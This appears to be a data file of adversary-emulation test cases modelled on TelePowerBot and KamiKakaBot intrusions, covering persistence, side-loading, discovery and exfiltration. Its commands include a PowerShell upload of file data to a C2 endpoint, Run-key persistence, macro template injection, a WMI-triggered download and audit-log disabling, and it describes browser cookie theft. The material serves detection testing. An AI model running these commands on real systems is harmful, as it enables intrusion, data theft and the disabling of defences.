extracted_ttps.description: The threat actors used email to send files from infected devices, with the email account credentials hardcoded in the script
Attacker used PowerShell to execute various commands and scripts, including those for lateral movement, credential theft, and data exfiltration
Threat actors used spear-phishing emails to gain initial access, posing as job applicants and sending malicious ISO images via shortened URLs or direct email attachments
Threat actors use DLL Side-Loading to execute malicious DLL files, which contain TelePowerBot or KamiKakaBot malware, by placing them in the same folder as a legitimate executable file
Threat actors use PowerShell to execute commands, including whoami and complex PowerShell scripts, to determine network resources and potentially exfiltrate files
Threat actors hide original files from the user and create a LNK file to launch malicious payloads

The macro code written into the template document works to ensure persistence for the malware by reading form fields and establishing values in registry keys.
The malicious DLL file is launched by the DLL Side-Loading technique, allowing the malware to persist on infected machines.
The user is tricked into opening a malicious LNK file, which appears as a legitimate folder

The threat actors used Telegram to receive files from infected devices, and the files were sent via a special command

Threat actors use spear-phishing emails to send ISO images containing malicious files to victims

Threat actors use PowerShell commands to gather information about the infected machine
PowerShell scripts used to launch communication between infected networks and threat actors' infrastructure

DLL Side-Loading to avoid detection during initial access
The threat actors used an already known technique to bypass User Account Control (UAC) to alter the settings in Windows Defender by elevating the COM interface
Attackers use spear-phishing emails for initial compromise
Victims were tricked into executing the malicious ISO image, which contained a signed executable file, a non-malicious decoy document, and a malicious DLL file
The threat actors used Dropbox to exfiltrate files from infected devices, with a series of PowerShell scripts that transfer files from a specific folder to a Dropbox account
The threat actors used a malicious MS Word document to automatically download a template document containing TelePowerBot from Github upon opening.
The functionality of the DLL file is to unpack the original executable from file Dism.sys, potentially modifying registry settings for persistence

Attacker potentially used PowerShell for malicious execution
Threat actors use the malicious DLL file to gain persistence for TelePowerBot in the registry of the infected machine
Threat actors use a stealer to parse data from browsers on the victim's machine and store it in a local folder
Threat actors execute standard commands, such as net share and Get-SmbShare, to determine network resources connected to the infected device
KamiKakaBot uses cmd.exe to execute commands
Threat actors use Template Injection to insert malicious macro code into MS Office documents, which are then used to launch malware
The attacker creates a registry key to launch TelePowerBot each time the user logs into their system

Attacker used file and directory discovery to identify files and directories of interest, including those containing sensitive data

attacks.description: Basic command to list all running processes using PowerShell
attacks.expected_behavior: Lists all running processes

attacks.description: Intermediate command to compress a file using PowerShell, demonstrating the use of `-Force` for file operations
attacks.expected_behavior: Creates a zip archive of a specified file in the temp directory

attacks.description: Advanced command to download a file using PowerShell, ensuring no use of `-Force` with `Invoke-WebRequest`
attacks.expected_behavior: Downloads a file from a specified URL to the temp directory

attacks.description: Basic PowerShell command to write a test message to a log file in the temp directory.
attacks.expected_behavior: Creates a file named test_exec.log in the system temp directory with the content 'Test execution via PowerShell'. No elevated privileges required. Safe for testing.

attacks.command: pwsh -Command "try { $content = 'Simulated credential dump'; $content | Out-File -FilePath $env:TEMP/cred_dump.txt -Force } catch { exit 1 }"
attacks.description: Intermediate command simulating credential theft by writing dummy data to a file in temp directory using forced output.
attacks.expected_behavior: Writes a simulated credential dump string to cred_dump.txt in temp. Uses -Force to ensure overwrite if file exists. No actual credentials accessed. File operation is safe and isolated.

attacks.command:
cmd /c "mkdir %TEMP%\side_load_test 2>nul && copy /Y C:\Windows\System32
otepad.exe %TEMP%\side_load_test\ >nul && echo DummyDLL > %TEMP%\side_load_test
otepad.dll && start "" %TEMP%\side_load_test
otepad.exe"
attacks.description: Basic side‑loading: create a test folder, copy a legitimate executable (notepad.exe), drop a dummy DLL named after the executable, and launch the executable.
attacks.expected_behavior: Notepad opens normally; a dummy file named notepad.dll is created in the same folder, demonstrating the placement of a malicious DLL alongside a legitimate executable.

attacks.command: cmd /c "mkdir %TEMP%\side_load_test 2>nul && copy /Y C:\Windows\System32\calc.exe %TEMP%\side_load_test\calc.exe >nul && echo TVqQAAMAAAAEAAAA//8AALg... > %TEMP%\dummy.b64 && certutil -decode %TEMP%\dummy.b64 %TEMP%\side_load_test\calc.dll >nul && start "" %TEMP%\side_load_test\calc.exe"
attacks.description: Intermediate side‑loading: copy calc.exe, create a base64‑encoded dummy DLL file, decode it with certutil into the same folder, then execute calc.exe.
attacks.expected_behavior: Calculator launches; a dummy DLL (calc.dll) is decoded and placed beside the executable, illustrating side‑loading without requiring elevated privileges.

attacks.command:
powershell -Command "$dllPath = "$env:TEMP\side_load_test\legitapp.dll"; New-Item -ItemType Directory -Path "$env:TEMP\side_load_test" -ErrorAction SilentlyContinue; [IO.File]::WriteAllBytes($dllPath, [byte[]](0x4D,0x5A,0x90,0x00)); Copy-Item -Path "C:\Windows\System32
otepad.exe" -Destination "$env:TEMP\side_load_test
otepad.exe" -Force; schtasks.exe /Create /SC ONCE /ST 00:00 /TR ""$env:TEMP\side_load_test
otepad.exe"" /TN "SideLoadTest" /F >$null"
attacks.description: Advanced side‑loading: write a minimal binary DLL file, copy a legitimate executable, and schedule its execution via schtasks (requires admin).
attacks.expected_behavior: A scheduled task named SideLoadTest is created; when triggered, notepad.exe runs from the test folder where a dummy DLL (legitapp.dll) resides, demonstrating side‑loading in a scheduled context.

attacks.description: Demonstrates loading a malicious library before a legitimate executable, simulating DLL side-loading on Linux.
attacks.expected_behavior: The legitimate executable loads the malicious library, potentially executing malicious code.

attacks.description: Copies a malicious library to a system library path, overwriting a legitimate library, then executes a legitimate executable that depends on this library.
attacks.expected_behavior: The system loads the malicious library when the legitimate executable is run, potentially leading to malicious code execution. This command has a high safety risk due to the overwrite of system files.

attacks.description: Temporarily modifies the library path to include a directory containing a malicious library, then executes a legitimate executable.
attacks.expected_behavior: The legitimate executable may load the malicious library if it depends on a library with the same name, potentially executing malicious code.

attacks.command: certutil.exe -decode "%TEMP%\template.b64" "%TEMP%\normal.dotm" >nul 2>&1 & reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WordTemplateHelper" /t REG_SZ /d "cmd.exe /c start winword \"%APPDATA%\\Microsoft\\Templates\\normal.dotm\"" /f
attacks.description: Simulates template injection by decoding a base64-encoded .dotm file to %TEMP%, then setting a registry persistence key to launch Word with the template on startup.
attacks.expected_behavior: Decodes a mock template file to %TEMP%, then adds a registry key under HKCU\Software\Microsoft\Windows\CurrentVersion\Run to execute Word with the template at user login. No actual macro is executed.

attacks.command:
powershell -Command "mkdir '%APPDATA%\Microsoft\Templates' -ErrorAction SilentlyContinue; $content = 'Attribute VB_Name = "AutoOpen"
Sub AutoOpen()
    Dim regKey As String
    regKey = "HKCU:\Software\TestTemplate\"
    SetRegistryValue regKey, "Injected", "1"
End Sub'; Set-Content -Path '%APPDATA%\Microsoft\Templates
ormal.dotm' -Value $content -Force; reg.exe add "HKCU\Software\Microsoft\Office\16.0\Word\Security\Trusted Locations\LocationTest" /v "Path" /t REG_SZ /d "%APPDATA%\Microsoft\Templates" /f"
attacks.description: Creates a mock VBA module in a Word template file in the default Templates directory and configures a trusted location in Word via registry to allow macro execution.
attacks.expected_behavior: Writes a mock VBA AutoOpen macro to a .dotm file in the user's Templates folder and adds a trusted location in Word's registry settings to allow macros from that path. No actual macro is run.

attacks.command:
powershell -Command "$macro = 'Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -EncodedCommand " + [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'TrustedTemplate' -Value 'cmd.exe /c echo TemplateActivated'")) + ""
    Shell cmd, vbHide
End Sub'; $outPath = '%TEMP%\malicious.dotm'; $dirPath = Split-Path -Path $outPath -Parent; mkdir $dirPath -ErrorAction SilentlyContinue; Set-Content -Path $outPath -Value $macro -Force"
attacks.description: Generates a VBA macro in a .dotm file that, when opened, would execute a PowerShell command to set a persistence registry key, simulating payload delivery via template macro.
attacks.expected_behavior: Creates a file in %TEMP% named malicious.dotm containing a VBA AutoOpen subroutine that encodes and executes a PowerShell command to set a registry persistence entry. The macro is not executed; only written to disk.

attacks.command: sudo sed -i 's/# End of cron jobs/@reboot touch \/tmp\/persistence_test\n\n# End of cron jobs/' /etc/cron.d/template_jobs
attacks.description: Inject a reboot cron job into a cron template file using sed
attacks.expected_behavior: Adds a cron job that creates /tmp/persistence_test on reboot. Requires template processing to activate.

attacks.command:
sudo sh -c 'echo -e "[Unit]
Description=Test Service

[Service]
ExecStart=/bin/sh -c 'echo \"template_injection_test\" > /tmp/systemd_persist'

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/test_template.service && systemctl enable test_template.service'
attacks.description: Create and enable a systemd service from a templated configuration
attacks.expected_behavior: Creates a persistent systemd service that writes to /tmp/systemd_persist on startup.

attacks.description: Modify Apache config template to inject a benign redirect rule
attacks.expected_behavior: Adds a redirect rule to Apache config template. Activates after config reload.

attacks.description: Compile a malicious shared library
attacks.expected_behavior: A malicious shared library is created in /tmp

attacks.description: Preload the malicious library before running a legitimate application
attacks.expected_behavior: The legitimate application loads the malicious library, demonstrating DLL Side-Loading

attacks.description: Cleanup: Remove the malicious shared library
attacks.expected_behavior: The malicious library is removed to prevent further exploitation

attacks.description: Create an ISO image containing a benign test file using PowerShell.
attacks.expected_behavior: An ISO file named test.iso will be created in the temp directory containing the test.txt file.

attacks.description: Download a benign file from a URL, then create an ISO image containing this file. This simulates receiving a file via email and preparing it for execution.
attacks.expected_behavior: A file test.txt will be downloaded from the specified URL and an ISO file named test.iso will be created in the temp directory containing the downloaded file.

attacks.description: Mount the created ISO image without assigning a drive letter, simulating the execution of malicious content from the email attachment.
attacks.expected_behavior: The ISO image will be mounted, making its contents accessible without a drive letter assignment.

attacks.description: Download a phishing ISO image from a remote server to a temporary directory.
attacks.expected_behavior: Downloads an ISO file from a specified URL to /tmp/phishing.iso. Simulates retrieval of a phishing attachment via command line.

attacks.command: mkdir -p /tmp/iso_mnt && sudo mount -o loop /tmp/phishing.iso /tmp/iso_mnt && cp /tmp/iso_mnt/*.elf /tmp/ && chmod +x /tmp/payload.elf && /tmp/payload.elf &
attacks.description: Mount the ISO image, copy a simulated malicious ELF binary, set execute permissions, and run it in the background.
attacks.expected_behavior: Creates a mount point, mounts the ISO using loopback, copies an executable file, makes it executable, and runs it. Requires root for mount. Represents execution phase after ISO access.

attacks.description: Extract contents of the ISO using 7-zip and execute a startup script without mounting (user-level alternative).
attacks.expected_behavior: Uses 7z to extract ISO contents to a directory, then runs a script inside. Avoids mount and root privileges. Simulates user-driven execution of extracted payload.

attacks.description: Disables UAC by modifying the Windows Registry directly using the reg binary.
attacks.expected_behavior: UAC will be disabled, allowing for elevation of privileges without prompting the user.

attacks.description: Uses PowerShell to create a registry key and then sets its value to disable UAC, ensuring a programmatic approach to bypassing UAC.
attacks.expected_behavior: UAC will be disabled, and the system will allow privilege escalation without user interaction.

attacks.description: Decodes a base64 encoded PowerShell script using certutil and then executes it to disable UAC, demonstrating an encoded command execution method.
attacks.expected_behavior: The decoded PowerShell script will execute and disable UAC, facilitating privilege escalation without prompting the user.

attacks.command: net use Z: \\remoteserver\share /user:Domain\User password /persistent:no && copy "%TEMP%\sample.txt" Z:\sample.txt && net use Z: /delete
attacks.description: Maps a remote SMB share as drive Z:, copies a test file from the local TEMP folder to the share, then unmaps the drive.
attacks.expected_behavior: The share is temporarily mounted, the file is transferred, and the mapping is removed without leaving persistent connections.

attacks.description: Compresses a folder in the TEMP directory into a ZIP archive, copies the archive to a remote SMB share using robocopy, then deletes the local ZIP.
attacks.expected_behavior: A ZIP file is created, transferred to the remote share, and the local copy is removed, demonstrating data staging and exfiltration via a remote service.

attacks.command: sc \\remoteserver create ExfilService binPath= "cmd.exe /c copy %TEMP%\exfil.txt \\remoteserver\share\exfil.txt" start= demand && sc \\remoteserver start ExfilService && sc \\remoteserver delete ExfilService
attacks.description: Creates a temporary Windows service on a remote host that copies a file from the local TEMP folder to the remote SMB share, starts the service to execute the copy, and then deletes the service.
attacks.expected_behavior: The service runs the copy command on the remote machine, achieving lateral movement and file exfiltration, and is cleaned up afterwards.

attacks.description: Adds a Run registry entry under the current user to launch Notepad at logon, demonstrating persistence via HKCU.
attacks.expected_behavior: A new string value named 'TestApp' is created in HKCU\Software\Microsoft\Windows\CurrentVersion\Run pointing to notepad.exe. The entry will cause Notepad to start each time the user logs on.

attacks.description: Creates a system‑wide Run registry entry under HKLM to launch a dummy executable from the TEMP directory at logon, requiring elevated privileges.
attacks.expected_behavior: A new string value named 'TestApp' is added to HKLM\Software\Microsoft\Windows\CurrentVersion\Run with a path to %TEMP%\dummy.exe. The entry persists for all users and will launch the dummy executable on system startup.

attacks.command: cmd /c "echo Windows Registry Editor Version 5.00 > %TEMP%\\persist.reg && echo [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce] >> %TEMP%\\persist.reg && echo \"AdvApp\"=\"\"C:\\Windows\\System32\\calc.exe\"\" >> %TEMP%\\persist.reg && reg import %TEMP%\\persist.reg"
attacks.description: Generates a temporary .reg file that adds a RunOnce entry under HKCU to execute Calculator once, then imports the file.
attacks.expected_behavior: A .reg file is created in the TEMP directory containing a RunOnce entry named 'AdvApp' pointing to calc.exe. Importing the file adds the entry to HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce, causing Calculator to run a single time at the next logon.

attacks.description: Create a new directory in the user's Temp folder and copy the browser's cookies file into it
attacks.expected_behavior: A new directory is created in the user's Temp folder, and the browser's cookies file is copied into it

attacks.description: Parse the contents of the browser's history file and store it in a new file
attacks.expected_behavior: The contents of the browser's history file are parsed and stored in a new file in the user's Temp folder

attacks.description: Execute a Base64-encoded command that copies the browser's data to a new folder
attacks.expected_behavior: A new file is created in the user's Temp folder, containing the decoded string

attacks.description: Basic: Copy Firefox cookies database to a temporary directory
attacks.expected_behavior: Copies Firefox's cookies.sqlite file from the default profile to /tmp/browser_steal if it exists. Creates the target directory if missing. Fails silently if source does not exist.

attacks.description: Intermediate: Copy Chrome's Cookies and History files to a hidden cache directory
attacks.expected_behavior: Copies Google Chrome's Cookies and History SQLite databases to /tmp/.cache. Uses a hidden directory to mimic stealthy behavior. Does not fail if source files are missing due to redirection of stderr.

attacks.description: Advanced: Locate and compress Brave browser data (cookies and login data) into a compressed archive
attacks.expected_behavior: Searches for Brave browser's Cookies and Login Data files, copies them to /tmp/.data, then compresses them into /tmp/.data.tgz and removes the original copied files. Uses common Linux tools (find, tar) for data aggregation and compression. Safe as it only accesses user-owned files.

attacks.command:
powershell -Command "$w=New-Object -ComObject Word.Application; $d=$w.Documents.Add(); $c=$d.VBProject.VBComponents.Add(1); $c.CodeModule.AddFromString('Sub AutoOpen()
 CreateObject(\"WScript.Shell\").Run \"cmd /c echo Macro executed >> %TEMP%\\macro_test.txt\"
End Sub'); $d.SaveAs(\"$env:TEMP\\test_macro.docm\", 13); $w.Quit()"
attacks.description: Creates a macro-enabled Word document that writes to TEMP when opened.
attacks.expected_behavior: Generates a Word document in %TEMP% that appends 'Macro executed' to macro_test.txt upon opening.

attacks.command:
powershell -Command "$tPath='$env:APPDATA\Microsoft\Templates\Malicious.dotm'; $w=New-Object -ComObject Word.Application; $d=$w.Documents.Add(); $d.VBProject.VBComponents.Add(1).CodeModule.AddFromString('Sub AutoOpen()
 CreateObject(\"WScript.Shell\").Run \"cmd /c echo Template macro executed >> %TEMP%\\macro_log.txt\"
End Sub'); $d.SaveAs($tPath, 13); $w.Quit(); $w2=New-Object -ComObject Word.Application; $d2=$w2.Documents.Add($tPath); $d2.SaveAs(\"$env:TEMP\\Report.docm\"); $w2.Quit()"
attacks.description: Creates a malicious template and document that logs execution to TEMP.
attacks.expected_behavior: Saves a template to AppData\Templates and creates a document triggering macro execution when opened.

attacks.command:
powershell -Command "$w=New-Object -ComObject Word.Application; $d=$w.Documents.Add(); $code='Sub AutoOpen()
 Dim c As String
 c = \"cmd /c echo Advanced execution >> \" & Environ(\"TEMP\") & \"\\adv_test.txt\"
 CreateObject(\"WScript.Shell\").Run c
End Sub'; $d.VBProject.VBComponents.Add(1).CodeModule.AddFromString($code); $d.SaveAs(\"$env:TEMP\\advanced_macro.docm\", 13); $w.Quit()"
attacks.description: Uses environment variables to dynamically construct the output path in VBA macro.
attacks.expected_behavior: Creates a macro document that builds the output path using %TEMP% environment variable.

attacks.description: Adds a registry entry to run calc.exe at user login using reg.exe
attacks.expected_behavior: Registry key is added under HKCU Run, causing calc.exe to launch when the user logs in.

attacks.description: Copies calc.exe to the user's Startup folder to achieve persistence
attacks.expected_behavior: calc.exe is copied to the Startup folder and will execute each time the user logs in.

attacks.description: Adds a registry entry to run an encoded PowerShell command that launches calc.exe at login
attacks.expected_behavior: Registry key is added with an encoded PowerShell payload; calc.exe will launch on user login via decoded command.

attacks.command:
mkdir -p ~/.config/autostart && printf '[Desktop Entry]
Type=Application
Exec=sh -c "sleep 10 && /bin/echo "TelePowerBot running" >> ~/telepowerbot.log"
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=TelePowerBot
Comment=Simulated advanced persistence with logging' > ~/.config/autostart/telepowerbot.desktop
attacks.description: Creates a more advanced autostart desktop entry that includes delayed execution and logs activity to a file
attacks.expected_behavior: A desktop entry is created that, on user login, waits 10 seconds then runs a shell command that logs a benign message to a file in the user's home directory.

attacks.technique_name: Command and Scripting Interpreter: Windows Command Shell
attacks.description: Execute whoami via sh and redirect output to /tmp
attacks.expected_behavior: Creates /tmp/whoami_output.txt containing current username

attacks.technique_name: Command and Scripting Interpreter: Windows Command Shell
attacks.description: Create hidden directory and write whoami output to hidden file
attacks.expected_behavior: Creates ~/.hidden/userinfo.txt with username; directory created if missing

attacks.technique_name: Command and Scripting Interpreter: Windows Command Shell
attacks.description: Run whoami as root via sudo and write to system log file
attacks.expected_behavior: Creates /var/log/whoami_audit.log with 'root' if executed with sudo privileges

attacks.description: Download a ZIP archive from a GitHub repository using certutil, a built-in Windows binary.
attacks.expected_behavior: Downloads the specified ZIP file from GitHub to the user's TEMP directory. Uses only built-in tools and no elevated privileges. No extraction occurs.

attacks.command: powershell -Command "& {$filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name='TempNetEvent';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_Tcpip_NetworkInterface\" AND TargetInstance.BytesReceived > 100000'}; $consumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name='TempNetConsumer';CommandLineTemplate='%COMSPEC% /c certutil.exe -urlcache -split -f \"https://github.com/example/test/archive/main.zip\" \"%TEMP%\\download.zip\"'}; Register-WmiEvent -Filter $filter -Consumer $consumer -Force}"
attacks.description: Simulate a WMI event subscription that triggers a download upon network activity threshold, mimicking persistence and execution via WMI.
attacks.expected_behavior: Creates a WMI event filter and consumer that would trigger a download when network usage exceeds a threshold. Requires administrator privileges to register WMI instances in root\subscription. The command uses proper escaping and built-in tools.

attacks.description: Execute a Base64-encoded PowerShell command that downloads and extracts a ZIP archive using certutil and Expand-Archive, simulating obfuscated delivery.
attacks.expected_behavior: Decodes and runs a PowerShell script that downloads a ZIP from GitHub using certutil and extracts it to a subdirectory in TEMP. The Base64 string is UTF-16LE encoded. Uses built-in tools and avoids .NET reflection. Safe for isolated testing.

attacks.description: Basic file discovery: lists file and folder names in the current user's Documents directory.
attacks.expected_behavior: Outputs a plain list of items (files and sub‑folders) present in %USERPROFILE%\Documents, one per line.

attacks.description: Intermediate discovery: enumerates up to 20 *.log files within the APPDATA tree, limited to two directory levels.
attacks.expected_behavior: Prints the full paths of up to 20 log files found under %APPDATA% within two sub‑directory levels.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: powershell -Command "$f='$env:TEMP\sample_audio.wav'; if(!(Test-Path $f)){Set-Content -Path $f -Value 'FAKE AUDIO DATA'}; $data=[IO.File]::ReadAllBytes($f); $b64=[Convert]::ToBase64String($data); Invoke-WebRequest -Uri 'http://10.0.0.5:8080/upload' -Method POST -Body $b64"
attacks.description: Basic exfiltration: reads a dummy audio file, base64‑encodes its contents, and POSTs the data to a HTTP C2 endpoint.
attacks.expected_behavior: Creates a placeholder audio file if missing, encodes it, and sends the encoded string to http://10.0.0.5:8080/upload via an HTTP POST request.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Intermediate exfiltration: compresses the audio file into a ZIP archive before sending the raw bytes to the C2 server.
attacks.expected_behavior: Creates a ZIP archive of the audio file in %TEMP% and uploads the binary ZIP content to http://10.0.0.5:8080/upload via HTTP POST.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Advanced exfiltration: opens a raw TCP connection to a C2 listener and streams the audio file bytes directly over the socket.
attacks.expected_behavior: Establishes a TCP connection to 10.0.0.5 on port 4444 and transmits the entire audio file as raw binary data, then closes the connection.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic exfiltration: sends a single audio file to a remote HTTP endpoint using curl.
attacks.expected_behavior: The file test_audio.wav is uploaded via an HTTP POST request to https://example-c2.com/upload; a successful response (e.g., HTTP 200) indicates the exfiltration succeeded.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Intermediate exfiltration: archives all .wav files, compresses them, then uploads the archive via curl.
attacks.expected_behavior: All wav files in the user's home directory are packaged into audio_bundle.tar.gz, which is then POSTed to the remote server. The server receives the compressed archive.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Advanced exfiltration: streams a chat log archive over a raw TCP connection after base64 encoding, simulating a custom C2 channel.
attacks.expected_behavior: The secret_chat.log file is tarred, base64‑encoded, and sent to the listening netcat service at 192.0.2.10:4444. The remote listener receives the encoded data, which can be decoded and extracted to retrieve the original file.

attacks.description: Basic PowerShell command writing a benign test string to a temporary file.
attacks.expected_behavior: Creates a file 'debug_log.txt' in the user's temp directory with the content 'Test execution via PowerShell'. No elevated privileges needed. Uses built-in PowerShell cmdlets safely.

attacks.description: Intermediate command using script block and Invoke-Expression with escaped quotes to simulate obfuscated execution.
attacks.expected_behavior: Executes a PowerShell script block that outputs 'PowerShell active' to the console. Demonstrates use of Invoke-Expression and variable-based command construction, which can be used in obfuscation. No file system changes or elevated rights required.

attacks.description: Advanced command using Base64-encoded PowerShell to output a health check message, simulating encoded payload execution.
attacks.expected_behavior: Decodes and runs a PowerShell command that writes 'Health Check pseudo-command' to the console. The Base64 string is UTF-16LE encoded from the command: [System.IO.Console]::WriteLine('Health Check pseudo-command'). No file creation or network activity. Safe for isolated testing.

attacks.description: List all shared resources on the local computer to identify potential targets for lateral movement.
attacks.expected_behavior: Displays a list of shared resources.

attacks.description: Identify removable media connected to the system using PowerShell.
attacks.expected_behavior: Lists removable disks (like USB drives) connected to the system.

attacks.description: Display a list of all computers and resources on the network to find targets for lateral movement.
attacks.expected_behavior: Displays a list of computers and shared resources in the network neighborhood.

attacks.description: List connected USB devices
attacks.expected_behavior: Lists all connected USB devices, which could be used to identify potential targets for lateral movement.

attacks.description: View network connections
attacks.expected_behavior: Displays active network connections, which could help in identifying network shares or connected devices.

attacks.description: View mounted filesystems
attacks.expected_behavior: Lists all mounted filesystems, including any removable media, which could be used to identify shared resources or points of entry.

attacks.description: Basic hostname and IP configuration discovery
attacks.expected_behavior: Displays computer name and detailed network adapter configuration including IP addresses

attacks.command: powershell -Command "Get-WmiObject Win32_ComputerSystem | Select-Object Name, Domain, Manufacturer | Format-List; netstat -ano"
attacks.description: Intermediate system details and network connections
attacks.expected_behavior: Lists computer name, domain, manufacturer and active network connections with process IDs

attacks.description: Advanced environment variable collection with IP config output
attacks.expected_behavior: Writes computer name, domain, and IP configuration to temporary file then displays contents

attacks.description: Basic system discovery: prints kernel version, architecture, and OS release information.
attacks.expected_behavior: Outputs a single line with kernel name, version, and other details, followed by the contents of /etc/os-release showing distribution name and version.

attacks.description: Intermediate discovery: reports filesystem usage and block device layout.
attacks.expected_behavior: Displays human‑readable disk space usage for each mounted filesystem and a table of block devices with size, type, and mount points.

attacks.description: Advanced discovery: gathers detailed CPU architecture and hardware system information, requiring root privileges.
attacks.expected_behavior: Shows CPU model, cores, and flags via lscpu, then provides DMI data such as system manufacturer, product name, and serial number.

attacks.command: powershell -Command "Add-Type -AssemblyName System.Windows.Forms, System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $path = '$env:TEMP\\screen_primary.png'; $bitmap.Save($path); $graphics.Dispose(); $bitmap.Dispose(); Write-Output 'Screenshot saved to $path'"
attacks.description: Takes a screenshot of the primary monitor using PowerShell and .NET graphics libraries, saves it as PNG in the TEMP directory
attacks.expected_behavior: PowerShell process spawns, captures the primary screen, saves image to %TEMP%\screen_primary.png, and exits cleanly. No UI is shown.

attacks.command: powershell -Command "Add-Type -AssemblyName System.Windows.Forms, System.Drawing; $bounds = [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $_.Bounds }; $totalWidth = ($bounds.Right | Measure-Object -Maximum).Maximum; $totalHeight = ($bounds.Bottom | Measure-Object -Maximum).Maximum; $bitmap = New-Object System.Drawing.Bitmap($totalWidth, $totalHeight); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, $bitmap.Size); $path = '$env:TEMP\\screen_all.png'; $bitmap.Save($path); $graphics.Dispose(); $bitmap.Dispose(); Compress-Archive -Path $path -DestinationPath '$env:TEMP\\screens.zip' -Force; Remove-Item $path -ErrorAction SilentlyContinue; Write-Output 'Multi-screen capture compressed to $env:TEMP\\screens.zip'"
attacks.description: Captures all screens into a single bitmap, saves as PNG, then compresses into a ZIP archive and deletes the original
attacks.expected_behavior: PowerShell captures full virtual desktop across all monitors, saves intermediate PNG, creates 'screens.zip' in TEMP, deletes PNG, and exits. Archive contains one image file.

attacks.description: Encodes a complex PowerShell command that captures full desktop across all monitors, opens the image, waits with a fake delay, compresses it, and cleans up variables
attacks.expected_behavior: PowerShell decodes and runs a script that captures all screens into a bitmap, saves it, opens the image (Invoke-Item), simulates activity via random sleep, compresses to ZIP, and clears variable references. No files are left on disk after execution.

attacks.description: Takes a full-screen screenshot using gnome-screenshot and saves it to the desktop
attacks.expected_behavior: Captures the entire screen and saves the image as screenshot.png on the user's desktop. No output is displayed if successful.

attacks.description: Uses scrot to capture a full-screen screenshot and save it to the runtime directory
attacks.expected_behavior: Takes a screenshot of the entire desktop and saves it with a timestamped filename in the runtime directory. Silent on success.

attacks.description: Uses ffmpeg to capture a single frame from the X11 display and save it as a PNG
attacks.expected_behavior: Captures the screen from the current X11 display and saves it as screenshot.png in the temp directory. Runs silently due to quiet log level.

attacks.description: Stop the Uncomplicated Firewall (UFW) service
attacks.expected_behavior: UFW service will be stopped, disabling firewall protections until next reboot or manual start.

attacks.description: Set SELinux to permissive mode
attacks.expected_behavior: SELinux will stop enforcing security policies while remaining loaded, reducing system hardening.

attacks.command: sudo auditctl -D && sudo systemctl stop auditd
attacks.description: Delete all audit rules and stop auditing service
attacks.expected_behavior: All auditd rules will be deleted and the service stopped, impairing security logging capabilities.

attacks.description: Basic DLL side-loading using LD_PRELOAD with a copied system library
attacks.expected_behavior: Wget executes normally but loads the specified shared object from /tmp

attacks.description: Intermediate library path hijacking via LD_LIBRARY_PATH
attacks.expected_behavior: Curl loads library from attacker-controlled directory in user space

attacks.description: Advanced system library replacement requiring root privileges
attacks.expected_behavior: Gzip executes while loading the replaced system library, demonstrating privileged persistence

attacks.description: Lists all running processes with verbose information including window titles, using built-in tasklist.exe
attacks.expected_behavior: Outputs a list of running processes with columns including Image Name, PID, Session Name, Session#, Mem Usage, Status, User Name, CPU Time, and Window Title. Some window titles may appear blank if the process does not have a visible window or if access is denied.

attacks.command: powershell -Command "Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object ProcessName, Id, MainWindowTitle"
attacks.description: Uses PowerShell to retrieve processes that have a main window title, filtering out background processes
attacks.expected_behavior: Outputs a list of processes with non-empty main window titles, showing ProcessName, Process ID, and the title of the main window. This helps identify user-interactive applications currently open.

attacks.command: powershell -Command "Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam); [DllImport(\"user32.dll\")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount); public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);' -Name Win32 -Namespace Enum -UsingNamespace System.Text; $callback = { param($hWnd, $lParam) $sb = New-Object System.Text.StringBuilder 256; [Enum.Win32]::GetWindowText($hWnd, $sb, 256) | Out-Null; if ($sb.Length -gt 0) { Write-Output "Window Handle: $hWnd, Title: $($sb.ToString())" } return $true }; [Enum.Win32]::EnumWindows($callback, [IntPtr]::Zero) | Out-Null"
attacks.description: Uses PowerShell Add-Type to define and call Win32 API functions EnumWindows and GetWindowText to enumerate all top-level window titles
attacks.expected_behavior: Enumerates all top-level windows on the system by calling Windows API functions. For each window with a title, outputs the window handle and title string. This method captures more windows than Get-Process and can include hidden or system-level windows if they have titles.

attacks.description: Creates and executes a batch file that writes test file
attacks.expected_behavior: Creates %TEMP%\test.txt via batch script execution

attacks.description: PowerShell pipeline writing file with -Force parameter
attacks.expected_behavior: Creates %TEMP%\ps_test.txt using forced file operation

attacks.command: cmd /c "echo Set objShell = CreateObject(""WScript.Shell"") > %TEMP%\script.vbs && echo objShell.Run ""powershell -Command 'Write-Output test | Out-File $env:TEMP\vbs_test.txt -Force'"", 0 >> %TEMP%\script.vbs && wscript %TEMP%\script.vbs"
attacks.description: VBScript executing hidden PowerShell command
